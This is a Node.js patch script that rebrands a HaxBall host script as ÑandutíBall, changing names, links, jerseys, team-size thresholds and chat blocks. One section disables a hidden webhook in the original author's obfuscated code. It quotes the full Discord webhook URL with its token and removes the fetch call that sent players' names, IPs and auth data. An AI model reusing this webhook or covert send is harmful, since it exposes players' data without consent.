// Aplica todos los cambios de ÑandutíBall sobre script.js.
//
// Sirve para volver a personalizar el script después de reemplazarlo por uno nuevo
// (por ejemplo, el original completo del autor). Se puede correr las veces que haga falta.
//
//   npm run parchar            aplica todo lo que falte
//   npm run parchar -- --ver   solo dice qué haría, sin tocar nada
//
// Los bloques de parches/bloques/ solo se agregan si el script no trae ya esa parte:
// si el script nuevo tiene su propio onPlayerChat o su onGameTick, no los pisamos.

const fs = require("fs");
const path = require("path");

const RAIZ = path.join(__dirname, "..");
const ARCHIVO = path.join(RAIZ, "script.js");
const SOLO_VER = process.argv.includes("--ver");

let script = fs.readFileSync(ARCHIVO, "utf8");
const hechos = [];
const saltados = [];

const reemplazar = (etiqueta, viejo, nuevo, marcaHecha) => {
  if (marcaHecha && script.includes(marcaHecha)) return saltados.push(`${etiqueta} (ya estaba)`);
  const veces = script.split(viejo).length - 1;
  if (!veces) return saltados.push(`${etiqueta} (no se encontró el texto original)`);
  script = script.split(viejo).join(nuevo);
  hechos.push(`${etiqueta} (${veces})`);
};

// ─────────────────────────────────────────────────────────────
// 0. Si el archivo viene cortado a la mitad, sacamos la última línea rota
// ─────────────────────────────────────────────────────────────
const tieneSintaxisValida = (texto) => {
  try {
    new Function(texto);
    return true;
  } catch {
    return false;
  }
};

if (!tieneSintaxisValida(script)) {
  const lineas = script.split("\n");
  const rota = lineas.pop();
  const recortado = lineas.join("\n") + "\n";
  if (tieneSintaxisValida(recortado)) {
    script = recortado;
    hechos.push(`✂️ Última línea cortada eliminada (${rota.length} caracteres)`);
  } else {
    console.error("❌ script.js tiene errores de sintaxis que no se arreglan quitando la última línea.");
    process.exit(1);
  }
}

// ─────────────────────────────────────────────────────────────
// 1. Webhook oculto del autor: deja de enviar, el link queda comentado
// ─────────────────────────────────────────────────────────────
reemplazar(
  "🔒 Webhook oculto desactivado",
  "var webhookID=_0x3c81f9(0x1b8);",
  "/* ⚠️ WEBHOOK OCULTO DEL AUTOR — DESACTIVADO POR ÑANDUTÍBALL\n" +
    "   Enviaba el nombre, la IP (player.conn) y el auth de cada jugador que entraba a:\n" +
    "   https://discord.com/api/webhooks/816061374504763402/Us5kMMIjcwUHylZ7-SBGnH2wkODNDHi24wvPk85wj6XecLB754wIHe-iEM776Sfk9_-Y\n" +
    "   Ese Discord no es nuestro. No volver a activarlo. */\nvar webhookID=null;",
  "WEBHOOK OCULTO DEL AUTOR"
);
reemplazar(
  "🔒 Envío al webhook oculto quitado",
  "fetch(webhookID,_0x338ced)['then'](_0x169fd3=>_0x169fd3),",
  "/* envío al webhook oculto quitado */",
  "envío al webhook oculto quitado"
);

// ─────────────────────────────────────────────────────────────
// 2. Marca: GLH → ÑandutíBall, hecho por Jinder
// ─────────────────────────────────────────────────────────────
// La versión primero: si no, la pisa la regla general de "by GLH"
reemplazar(
  "🏷️ Versión del script",
  "| Futsal by GLH ``",
  "| Ñᴀɴᴅᴜᴛɪ́Bᴀʟʟ, ʜᴇᴄʜᴏ ᴘᴏʀ Jɪɴᴅᴇʀ ``",
  "Ñᴀɴᴅᴜᴛɪ́Bᴀʟʟ"
);
reemplazar("🏷️ Mapas 'by GLH'", / by GLH/g, " by ÑandutíBall");
reemplazar("🏷️ Mapas 'By GLH'", / By GLH/g, " by ÑandutíBall");
reemplazar(
  "🏷️ Saludo del juego",
  "      👋 Bɪᴇɴᴠᴇɴɪᴅᴏ ᴀʟ ʜᴏsᴛ ᴅᴇ G L H      ",
  "      👋 Bɪᴇɴᴠᴇɴɪᴅᴏ ᴀ Ñ A N D U T Í B A L L      "
);
// Dibujo de bloques del saludo (3 textos del bloque ofuscado)
if (/▒█/.test(script)) {
  const E = String.fromCharCode(0x202f);
  const lineas = [
    " ▄▀▄▀                                  ▄▀\\n░█▄─░█ ─█▀▀█ ░█▄─░█ ░█▀▀▄ ░█─░█ ▀▀█▀▀ ▀█▀\\n░█░█░█ ░█▄▄█ ░█░█░█ ░█─░█ ░█─░█ ─░█── ─█─\\n░█──▀█ ░█─░█ ░█──▀█ ░█▄▄▀ ─▀▄▄▀ ─░█── ▄█▄",
    "░█▀▀█ ─█▀▀█ ░█─── ░█───\\n░█▀▀▄ ░█▄▄█ ░█─── ░█───\\n░█▄▄█ ░█─░█ ░█▄▄█ ░█▄▄█",
    E.repeat(4) + "✺ 🇵🇾 El host paraguayo de HaxBall, hecho por Jinder 🇵🇾 ✺",
  ];
  let i = 0;
  script = script.replace(/[\u0020\u00a0\u202f]*▒█[▀▄░█\u0020\u00a0\u202f]*/g, () => lineas[i++] || "");
  hechos.push("🏷️ Dibujo del saludo");
}
reemplazar(
  "🏷️ Link de la web de GLH",
  "🌐 𝐖𝐞𝐛 𝐆𝐋𝐇: https://grandesligashaxball.wixsite.com/grandesligashaxball/",
  "🇵🇾 ÑandutíBall - Host paraguayo de HaxBall"
);
reemplazar(
  "🏷️ Link de Discord ajeno",
  "🔗 𝗗𝗶𝘀𝗰𝗼𝗿𝗱 𝗥𝗦𝗜: https://discord.gg/BZkDuSV",
  "🕸️ ÑandutíBall, hecho por Jinder"
);
reemplazar(
  "🏷️ Anuncio del partido",
  '"✨ ÚNETE AL DISCORD DE GLH Y APRENDE A CREAR TU PROPIO HOST CON SCRIPT: discord.gg/tDEUbJU8QB"',
  '"🕸️ ÑANDUTÍBALL 🇵🇾 - El host paraguayo de HaxBall, hecho por Jinder"'
);
reemplazar("🏷️ Pelota 'glh'", 'TipoPelotaFutsal === "glh"', 'TipoPelotaFutsal === "nanduti"');
reemplazar(
  "🏷️ Tutorial: links de GLH",
  "room.sendAnnouncement('🔗 LINK DEL SCRIPT: bit.ly/GLH-Script',player.id,GeneradorColoresRandom2,\"normal\",0)",
  "room.sendAnnouncement('🕸️ ÑandutíBall — host paraguayo de HaxBall, hecho por Jinder',player.id,GeneradorColoresRandom2,\"normal\",0)"
);
reemplazar(
  "🏷️ Comando !glh → !nanduti",
  'message==="!glh"&&player.admin){TipoPelotaFutsal="glh";room.sendAnnouncement("Pelota cambiada a GLH',
  'message==="!nanduti"&&player.admin){TipoPelotaFutsal="nanduti";room.sendAnnouncement("Pelota cambiada a ÑandutíBall'
);

// Mensaje de bienvenida: se reemplaza el array entero
const iniBienvenida = script.indexOf("const MensajeDeBienvenida = [");
if (iniBienvenida === -1) {
  saltados.push("🏷️ Mensaje de bienvenida (no se encontró)");
} else {
  const finBienvenida = script.indexOf("\n];", iniBienvenida) + 3;
  const actual = script.slice(iniBienvenida, finBienvenida);
  if (actual.includes("ÑandutíBall")) {
    saltados.push("🏷️ Mensaje de bienvenida (ya estaba)");
  } else {
    script = script.slice(0, iniBienvenida) + fs.readFileSync(path.join(__dirname, "bloques", "bienvenida.txt"), "utf8").trimEnd() + script.slice(finBienvenida);
    hechos.push("🏷️ Mensaje de bienvenida");
  }
}

// ─────────────────────────────────────────────────────────────
// 3. Configuración base (bot visible, nombre del bot)
// ─────────────────────────────────────────────────────────────
reemplazar("⚙️ Bot visible", "var BotVisible = false;", "var BotVisible = true;", "var BotVisible = true;");
reemplazar("⚙️ Nombre del bot", '"🚩 Árbitro Bot 🤖"', '"🚩 Ñandu Bot 🤖"', "Ñandu Bot");

// ─────────────────────────────────────────────────────────────
// 4. Camisetas paraguayas
// ─────────────────────────────────────────────────────────────
const camisetas = require("./camisetas");
if (script.includes('"riv/titular/red"') || !script.includes('"oli/titular/red"')) {
  script = camisetas.aplicar(script);
  hechos.push("👕 Camisetas paraguayas (29 clubes)");
} else {
  saltados.push("👕 Camisetas paraguayas (ya estaban)");
}

// ─────────────────────────────────────────────────────────────
// 5. Modo automático: Futsal x3 → x4 → x5 → x7
// ─────────────────────────────────────────────────────────────
const umbralesViejos =
  "if(numJugadores===1){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getEntrenamientoFutsalMap(),scoreLimit:GolesEntrenamientoFutsal,timeLimit:TiempoEntrenamientoFutsal}}" +
  "else if(numJugadores>1&&numJugadores<=3){maxPlayersPerTeam=1;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}" +
  "else if(numJugadores>=4&&numJugadores<=5){maxPlayersPerTeam=2;nuevaConfiguracion={mapa:getFutx2Map(),scoreLimit:GolesFutsalx2,timeLimit:TiempoFutsalx2}}" +
  "else if(numJugadores>=6&&numJugadores<=7){maxPlayersPerTeam=3;nuevaConfiguracion={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores>=8&&numJugadores<=9){maxPlayersPerTeam=4;nuevaConfiguracion={mapa:getFutx4Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores>=10&&numJugadores<=11){maxPlayersPerTeam=5;nuevaConfiguracion={mapa:getFutx5Map(),scoreLimit:GolesFutsalx5,timeLimit:TiempoFutsalx5}}" +
  "else if(numJugadores>=14){maxPlayersPerTeam=7;nuevaConfiguracion={mapa:getFutx7Map(),scoreLimit:GolesFutsalx7,timeLimit:TiempoFutsalx7}}";
const umbralesNuevos =
  "if(numJugadores<=7){maxPlayersPerTeam=3;nuevaConfiguracion={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}}" +
  "else if(numJugadores<=9){maxPlayersPerTeam=4;nuevaConfiguracion={mapa:getFutx4Map(),scoreLimit:GolesFutsalx4,timeLimit:TiempoFutsalx4}}" +
  "else if(numJugadores<=13){maxPlayersPerTeam=5;nuevaConfiguracion={mapa:getFutx5Map(),scoreLimit:GolesFutsalx5,timeLimit:TiempoFutsalx5}}" +
  "else{maxPlayersPerTeam=7;nuevaConfiguracion={mapa:getFutx7Map(),scoreLimit:GolesFutsalx7,timeLimit:TiempoFutsalx7}}";
reemplazar("🗺️ Umbrales x3/x4/x5/x7", umbralesViejos, umbralesNuevos, "if(numJugadores<=7){maxPlayersPerTeam=3;");
reemplazar(
  "🗺️ Arranque del modo automático en x3",
  "modoJueganAlgunos=!0;maxPlayersPerTeam=1;configuracionActual={mapa:getEntrenamientoFutsalMap(),scoreLimit:GolesEntrenamientoFutsal,timeLimit:TiempoEntrenamientoFutsal}",
  "modoJueganAlgunos=!0;maxPlayersPerTeam=3;configuracionActual={mapa:getFutx3Map(),scoreLimit:GolesFutsalx3,timeLimit:TiempoFutsalx3}"
);

// ─────────────────────────────────────────────────────────────
// 6. Bloques propios (solo si el script no trae ya esa parte)
// ─────────────────────────────────────────────────────────────
const BLOQUES = [
  { archivo: "compat.txt", marca: "🩹 PIEZAS QUE FALTABAN", nombre: "🩹 Piezas que faltaban", siFalta: () => true },
  { archivo: "rangos.txt", marca: "🎖️ RANGOS CON CLAVE", nombre: "🎖️ Rangos con clave", siFalta: () => true },
  {
    archivo: "arbitraje.txt",
    marca: "🧑‍⚖️ ARBITRAJE",
    nombre: "🧑‍⚖️ Arbitraje (goles y equipos)",
    siFalta: (s) => !/room\.onTeamGoal\s*=/.test(s),
  },
  {
    archivo: "comandos.txt",
    marca: "💬 COMANDOS DEL CHAT",
    nombre: "💬 Comandos del chat",
    siFalta: (s) => !/room\.onPlayerChat\s*=/.test(s),
  },
];

// Sacamos nuestros bloques viejos antes de volver a escribirlos
for (const bloque of BLOQUES) {
  const i = script.indexOf("\n\n// ▇▇▇▇▇▇▇▇▇ " + bloque.marca);
  if (i !== -1) script = script.slice(0, i) + script.slice(script.indexOf("\n", script.length - 1) + 1 || script.length);
}
// (el corte anterior solo saca el primero; recortamos desde el primer bloque nuestro)
const primero = BLOQUES.map((b) => script.indexOf("\n\n// ▇▇▇▇▇▇▇▇▇ " + b.marca)).filter((i) => i !== -1).sort((a, b) => a - b)[0];
if (primero !== undefined) script = script.slice(0, primero);

for (const bloque of BLOQUES) {
  if (!bloque.siFalta(script)) {
    saltados.push(`${bloque.nombre} (el script ya lo trae)`);
    continue;
  }
  script = script.trimEnd() + "\n" + fs.readFileSync(path.join(__dirname, "bloques", bloque.archivo), "utf8");
  hechos.push(bloque.nombre);
}

// ─────────────────────────────────────────────────────────────
console.log("\n══ Parches de ÑandutíBall ══\n");
console.log("APLICADOS:");
console.log(hechos.length ? hechos.map((h) => "  ✅ " + h).join("\n") : "  (ninguno)");
console.log("\nSALTADOS:");
console.log(saltados.length ? saltados.map((h) => "  ⏭️  " + h).join("\n") : "  (ninguno)");

if (SOLO_VER) {
  console.log("\n👀 Modo --ver: no se escribió nada.");
  process.exit(0);
}

// Guardamos una copia antes de tocar el archivo
const copia = path.join(RAIZ, "script.anterior.js");
fs.copyFileSync(ARCHIVO, copia);
fs.writeFileSync(ARCHIVO, script);
console.log(`\n💾 script.js actualizado (copia del anterior en script.anterior.js)`);
console.log("👉 Ahora corré:  npm run prueba");
